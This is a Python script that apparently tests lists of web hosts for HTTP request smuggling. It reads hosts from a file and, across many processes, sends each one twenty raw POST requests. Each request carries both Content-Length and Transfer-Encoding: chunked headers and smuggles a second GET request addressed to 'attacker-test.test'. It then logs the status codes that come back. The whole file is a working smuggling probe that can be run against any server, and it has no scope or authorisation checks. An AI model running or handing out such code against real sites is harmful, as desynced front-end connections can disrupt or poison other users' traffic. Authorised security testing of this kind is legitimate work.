import argparse
import multiprocessing
import random
import re
import socket, ssl
import string
import time
from itertools import repeat
from multiprocessing import Pool

#Usage: python3 smuggling_tester_modular.py --input input

input_file = 'input'
output_file = 'output'

def get_hosts():
    global input_file
    hosts = []

    with open(input_file) as f:
        lines = f.readlines()
        for host in lines:
            hosts.append(host.strip())
    f.close()
    return hosts

def checkArguments():
    global input_file
    global output_file

    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--input", type=str, required=True, help="Input file")
    parser.add_argument("-o", "--output",type=str, default="output", help="Output file")

    args = parser.parse_args()
    
    input_file = args.input
    output_file = args.output

#def make_socket_ssl_request(host):
def make_socket_ssl_request(host, q):

    print("Testing: ", host[0], " ", host[1])
    context = ssl._create_unverified_context(ssl.PROTOCOL_TLS_CLIENT)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)

    try:
        s_sock = context.wrap_socket(sock, server_hostname=host[0])
        s_sock.connect((host[0], 443))
    except socket.gaierror as e:
        print("gaierror: ", host[0])
        return None
    except ssl.SSLError as e:
        print("SSL Error: ", host[0])
        return None
    except TimeoutError as e:
        print("Timed out: ", host[0])
        return None
    except ConnectionRefusedError as e:
        print("Connection Refused Error: ", host[0])
        return None
    except ConnectionResetError as e:
        print("Connection Reset Error: ", host[0])
    except Exception as x:
         print("Request Error ", host[0])
         return None

    if host[1] == 'base':
        headers = b"GET / HTTP/1.1\r\nHost: " + host[0].encode('utf-8') + b"\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36" + b"\r\nAccept-Language: en-US,en;q=0.9" + b"\r\nAccept: */*" b"\r\n\r\n"
    else:
        headers = b"GET /?cache_buster=" + host[2].encode('utf-8') + b" HTTP/1.1\r\nHost: " + host[0].encode('utf-8') + b"\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36" + b"\r\nAccept-Language: en-US,en;q=0.9" + b"\r\nAccept: */*" b"\r\n\r\n"
    
    s_sock.sendall(headers)

    response = []
    response_body = ""

    try:

        while True:
            chunk = s_sock.recv(2048)
            if not chunk: 
                break
            response.append(chunk)
    except socket.timeout as e:
        for res_part in response:
            try:
                response_body = response_body + res_part.decode()
            except UnicodeDecodeError as e:
                print("UnicodeDecodeError: ", host[0])
    except ssl.SSLError as e:
        print("SSL Error: ", host[0])
    except TimeoutError as e:
         print("Timed out: ", host[0])
    except socket.gaierror as e:
         print("gaierror: ", host[0])
    except Exception as x:
         print("Request Error ", host[0])

    s_sock.close()
    
    #match = re.search("200 OK", response_body)
    #match = re.search("Page Not Found.*", response_body)
    #match = re.search("testcheck.com", response_body)
    #match = re.search("Access-Control-Allow-Origin: " + host + ".testcheck.com", response_body)
    #match = re.findall("HTTP.*", response_body)
    match = re.search("HTTP.*", response_body)

    if match:
        if len((match.group()).split(" ")) > 1:
            status_code = (match.group()).split(" ")[1]

            print("Pattern found: ", host[0], " ", status_code)

            q.put(host[0] + "/?cache_buster=" + host[2] + " " + status_code)
            return host[0], "/?cache_buster=", host[2], " ", status_code
    else:
        q.put(host[0] + "/?cache_buster=" + host[2] + " 000")
        print(host[0], "/?cache_buster=", host[2] + " 000")

def make_socket_request(host, q):
    proxy_host = '127.0.0.1'
    proxy_port = 8080 # or your proxy's port
    target_url = host[0]

    request_line = f"POST / HTTP/1.1\r\n"
    headers = """Host: """ + target_url + """\r\nContent-Length: 55\r\nTransfer-Encoding: chunked\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\n\n1\r\nA\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: attacker-test.test\r\n\r\n"""

    full_request = (request_line + headers).encode('utf-8')

    s_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s_sock.settimeout(5)

    response = []
    response_body = ""

    s_sock.connect((target_url, 80))
    s_sock.sendall(full_request)

    try:

        while True:
            chunk = s_sock.recv(2048)
            if not chunk: 
                break
            response.append(chunk)
    except socket.timeout as e:
        print("Socket Timeout Error: ", target_url)
    except ssl.SSLError as e:
        print("SSL Error: ", target_url)
    except TimeoutError as e:
         print("Timed out: ", target_url)
    except socket.gaierror as e:
         print("gaierror: ", target_url)
    except Exception as x:
         print("Request Error ", target_url)

    for res_part in response:
        try:
            response_body = response_body + res_part.decode()
        except UnicodeDecodeError as e:
            print("UnicodeDecodeError: ", host[0])

    matches = re.findall("HTTP\/[\d\.]+ [\d]+", response_body)

    if matches:
        if len(matches) > 1:
            q.put(host[0] + "/?cache_buster=" + host[2] + " multiple status codes in response")

        if len(matches[0].split(" ")) > 1:
            status_code = matches[0].split(" ")[1]
            q.put(host[0] + "/?cache_buster=" + host[2] + " " + status_code)

    else:
        q.put(host[0] + "/?cache_buster=" + host[2] + " 000")
        
def listener(q, output_file):

    #with open('output', 'w') as f:
    with open(output_file, 'w') as f:
        while 1:
            m = q.get()
            if m == 'kill':
                #f.write('killed')
                break
            f.write(str(m) + '\n')
            f.flush()

if __name__ == '__main__':
    s = time.perf_counter()

    checkArguments()

    manager = multiprocessing.Manager()
    q = manager.Queue()

    hosts = get_hosts()

    hosts_request_types = []

    for host in hosts:
        hosts_request_types.append((host, "base", "testcheck"))

    cache_buster = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))

    for host in hosts:
         for i in range(20):
            hosts_request_types.append((host, "modified", cache_buster))

    with Pool(processes=multiprocessing.cpu_count()) as pool:
        watcher = pool.apply_async(listener, (q, output_file))
        
        try:
            #results = pool.starmap(make_socket_ssl_request, zip(hosts_request_types, repeat(q)))
            results = pool.starmap(make_socket_request, zip(hosts_request_types, repeat(q)))            
        except socket.gaierror as e:
            print("gaierror")
        except TimeoutError as e:
            print("Timed out")
        
        q.put('kill')
        pool.close()
        pool.join()

    elapsed = time.perf_counter() - s
    
    print(f"Execution time: {elapsed:0.2f} seconds")
